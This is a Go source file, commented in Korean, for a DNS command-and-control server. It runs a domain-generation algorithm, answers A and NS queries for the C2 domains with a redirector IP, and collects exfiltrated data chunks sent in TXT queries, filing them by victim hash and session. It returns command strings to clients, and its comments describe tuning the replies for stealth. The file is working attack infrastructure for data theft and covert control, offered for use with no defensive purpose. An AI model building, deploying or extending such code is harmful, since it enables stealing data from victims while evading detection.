// main.go - 최종 수정본 (A/NS/CAA 응답 로직 및 은닉성 강화)

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

const (
	listenAddr         = ":53"
	basePath           = "/root/dns-c2"
	logPath            = basePath + "/logs/raw/dns_query.log"
	resultPath         = basePath + "/logs/results"
	exfilSessionFile   = basePath + "/server/exfil_sessions.json"
	redirectorIP       = "146.190.80.69" // Nginx 리다이렉터 서버 IP

	// [수정] 네임서버 호스트네임 상수화
	primaryNSHostname   = "ns1.pintruder.com."
	secondaryNSHostname = "ns2.pintruder.com."
)

// ... (SessionState 구조체 및 기타 변수 선언은 기존과 동일) ...
type SessionState struct {
	VictimHash string    `json:"victim_hash"`
	LastChunk  int       `json:"last_chunk"`
	LastUpdate time.Time `json:"last_update"`
}

var (
	config = map[int]struct {
		seed  int
		shift int
		mod   int
		tlds  []string
	}{
		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us", "xyz", "top", "info"}},
	}
	fixedDomain  = "pintruder.com"
	sessionData  map[string]SessionState
	sessionMutex = &sync.Mutex{}
)

// ... (loadSessions, saveSessions, dga, saveLog 등 헬퍼 함수들은 기존과 동일) ...
func loadSessions() {
	sessionMutex.Lock(); defer sessionMutex.Unlock(); sessionData = make(map[string]SessionState)
	data, err := os.ReadFile(exfilSessionFile)
	if err != nil { return }
	json.Unmarshal(data, &sessionData)
}
func saveSessions() {
	sessionMutex.Lock(); defer sessionMutex.Unlock()
	data, err := json.MarshalIndent(sessionData, "", "  ")
	if err != nil { return }
	os.WriteFile(exfilSessionFile, data, 0644)
}
func ror32(v, s uint32) uint32 { return (v >> s) | (v << (32 - s)) }
func rol32(v, s uint32) uint32 { return (v << s) | (v >> (32 - s)) }
func dga(date time.Time, configNr, domainNr int) string {
	c := config[configNr]; period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day() / 21)
	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))
	if c.seed != 0 { t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift)) }
	nr := rol32(uint32(domainNr), 21); s := rol32(uint32(c.seed), 17)
	r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001)
	length := (r % 12) + 7; domain := ""
	for i := 0; i < int(length); i++ {
		r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001)
		domain += string(r%25 + 'a')
	}
	domain += "."; r = ror32(r*0xB11924E1, uint32(c.shift))
	tldI := (r + 0x27100001) % uint32(len(c.tlds)); domain += c.tlds[tldI]
	return domain
}
func saveLog(entry string) {
	os.MkdirAll(filepath.Dir(logPath), 0755); f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }; defer f.Close(); f.WriteString(entry + "\n")
}
func atoi(s string) int { i, _ := strconv.Atoi(s); return i }
func saveChunk(victim, session, idx, data string) error {
	sessionDir := filepath.Join(resultPath, victim, "session_"+session)
	os.MkdirAll(sessionDir, 0755); filePath := filepath.Join(sessionDir, fmt.Sprintf("chunk_%s.b64", idx))
	return os.WriteFile(filePath, []byte(data), 0644)
}

func validDomain(qname string) bool {
    // qname에 마지막 점(.)이 있을 수 있으므로 제거하고 비교
    trimmedName := strings.TrimSuffix(qname, ".")

    // 1. 고정 도메인과 일치하는지 확인
    if trimmedName == fixedDomain {
        return true
    }

    // 2. DGA로 생성된 도메인과 일치하는지 확인
    now := time.Now().UTC()
    for i := 0; i < 30; i++ {
        if trimmedName == dga(now, 1, i) {
            return true
        }
    }
    return false
}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := new(dns.Msg)
    msg.SetReply(r)
    msg.Compress = false

    q := r.Question[0]
    qname := strings.ToLower(q.Name) // qname은 마지막 점(.)을 포함
    logEntry := fmt.Sprintf("%s | 도메인: %s | 타입: %s | 클라이언트: %s",
        time.Now().Format(time.RFC3339), qname, dns.TypeToString[q.Qtype], w.RemoteAddr().String())
    fmt.Println(logEntry)
    saveLog(logEntry)

    // 1. A 레코드 쿼리 처리: SSL 인증 및 C2 접속용
    if q.Qtype == dns.TypeA {
        // 수정된 validDomain 함수를 사용하여 정확히 C2 도메인 자체에 대한 요청인지 확인
        if validDomain(qname) {
            log.Printf("[A Record] Responding with Redirector IP for valid C2 domain: %s", qname)
            msg.Answer = append(msg.Answer, &dns.A{
                Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
                A:   net.ParseIP(redirectorIP),
            })
        } else {
            msg.SetRcode(r, dns.RcodeNameError) // NXDOMAIN
        }
        w.WriteMsg(msg)
        return
    }

    // 2. NS 쿼리 처리: 네임서버 2개 요구사항 충족
    if q.Qtype == dns.TypeNS {
        if validDomain(qname) {
            msg.Answer = append(msg.Answer, &dns.NS{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 3600}, Ns: primaryNSHostname})
            msg.Answer = append(msg.Answer, &dns.NS{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 3600}, Ns: secondaryNSHostname})
        }
        w.WriteMsg(msg)
        return
    }

    // 3. CAA 레코드 쿼리 처리: Let's Encrypt 인증용
    if q.Qtype == dns.TypeCAA {
        msg.SetRcode(r, dns.RcodeSuccess) // NOERROR, 빈 응답
        w.WriteMsg(msg)
        return
    }

    // 4. TXT 레코드 쿼리 처리: C2 데이터 통신
    if q.Qtype == dns.TypeTXT {
        parts := strings.Split(strings.TrimSuffix(qname, "."), ".")

        // init 요청 처리
        if parts[0] == "init" && len(parts) >= 4 {
            sessionID := parts[1]
            sessionMutex.Lock()
            session, exists := sessionData[sessionID]
            sessionMutex.Unlock()
            last := -1
            if exists { last = session.LastChunk }
            state := fmt.Sprintf("STATE:{\"last_chunk\":%d}", last)
            msg.Answer = append(msg.Answer, &dns.TXT{
                Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1},
                Txt: []string{state},
            })
            w.WriteMsg(msg)
            log.Printf("init 요청 응답: 세션 %s, 마지막 청크 %d", sessionID, last)
            return
        }

        // 데이터 유출(exfil) 요청 처리
        if len(parts) >= 6 && (len(parts[0]) >= 1 && parts[0][0] >= '0' && parts[0][0] <= '9') {
            chunkIdxStr, chunkIdx := parts[0], atoi(parts[0])
            sessionID, victimHash := parts[3], parts[4]
            b32data := parts[1] + parts[2]

            if err := saveChunk(victimHash, sessionID, chunkIdxStr, b32data); err == nil {
                sessionMutex.Lock()
                session, exists := sessionData[sessionID]
                if !exists { session = SessionState{VictimHash: victimHash, LastChunk: -1} }
                if chunkIdx > session.LastChunk {
                    session.LastChunk = chunkIdx; session.LastUpdate = time.Now().UTC(); sessionData[sessionID] = session
                    go saveSessions()
                }
                sessionMutex.Unlock()
            }

            // [수정] 클라이언트의 "Malformed CMD" 로그 방지를 위해 명령어 형식 변경
            ackCmd := "0|status" 
            msg.Answer = append(msg.Answer, &dns.TXT{
                Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1},
                Txt: []string{fmt.Sprintf("ACK:%s|CMD:%s", chunkIdxStr, ackCmd)},
            })
            w.WriteMsg(msg)
            return
        }

        // 처리할 수 없는 TXT 요청은 NXDOMAIN 처리
        msg.SetRcode(r, dns.RcodeNameError)
        w.WriteMsg(msg)
        return
    }

    // 5. 그 외 모든 쿼리 타입 처리: 은닉성을 위해 NOERROR와 빈 응답 반환
    msg.SetRcode(r, dns.RcodeSuccess)
    w.WriteMsg(msg)
}

func main() {
	log.Println("[VERSION CHECK] v8 - Comprehensive Handler Logic")
	loadSessions()
	os.MkdirAll(filepath.Dir(logPath), 0755)

	dns.HandleFunc(".", handleRequest)

	udpSrv := &dns.Server{Addr: listenAddr, Net: "udp"}
	tcpSrv := &dns.Server{Addr: listenAddr, Net: "tcp"}

	log.Println("[+] UDP & TCP 서버 시작, 주소:", listenAddr)
	go func() {
		if err := udpSrv.ListenAndServe(); err != nil {
			log.Fatalf("UDP 서버 실패: %v", err)
		}
	}()
	go func() {
		if err := tcpSrv.ListenAndServe(); err != nil {
			log.Fatalf("TCP 서버 실패: %v", err)
		}
	}()
	select {}
}
